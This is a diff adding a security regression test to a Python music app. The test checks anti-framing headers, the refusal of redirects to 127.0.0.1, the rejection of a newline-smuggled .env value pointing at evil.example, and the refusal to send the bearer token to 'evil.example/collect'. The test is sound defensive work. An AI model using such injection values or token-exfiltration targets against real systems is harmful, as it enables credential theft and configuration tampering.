@@ -528,6 +528,36 @@ def issue_lastfm_unreadable_reply():
         os.environ.pop("LASTFM_API_KEY") if orig[2] is None else os.environ.update(LASTFM_API_KEY=orig[2])
 
 
+def issue_public_release_hardening():
+    # Regression: pre-publish security review. (1) the image relay's allow-list was skipped by redirects,
+    # (2) no anti-framing / CSP headers, (3) a newline in a saved key could write extra lines into .env,
+    # (4) spotify._get would attach the bearer token to any URL it was handed.
+    r = client.get("/api/status")
+    assert r.headers["X-Frame-Options"] == "DENY" and "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
+    assert r.headers["X-Content-Type-Options"] == "nosniff"
+
+    seen = []
+
+    class Redirect:
+        ok, status_code, headers, content = True, 302, {"Location": "http://127.0.0.1:9/internal"}, b""
+    orig = deep_cuts.requests.get
+    deep_cuts.requests.get = lambda url, **kw: (seen.append(kw), Redirect())[1]
+    try:
+        r = client.get("/api/img", query_string={"u": "https://i.scdn.co/image/abc"})
+    finally:
+        deep_cuts.requests.get = orig
+    assert seen and seen[0].get("allow_redirects") is False and r.status_code == 502, (seen, r.status_code)
+
+    r = client.post("/api/settings", json={"spotify_client_id": "abc\nSPOTIFY_REDIRECT_URI=http://evil.example/cb"})
+    assert r.get_json()["saved"] == [] and "spotify_client_id" in r.get_json()["errors"], r.get_json()
+
+    try:
+        deep_cuts.spotify._get("https://evil.example/collect")
+        raise AssertionError("token was sent to a foreign host")
+    except ValueError as e:
+        assert "evil.example" in str(e)
+
+
 if __name__ == "__main__":
     for name, check in list(globals().items()):
         if name.startswith(("issue_", "feature_")):
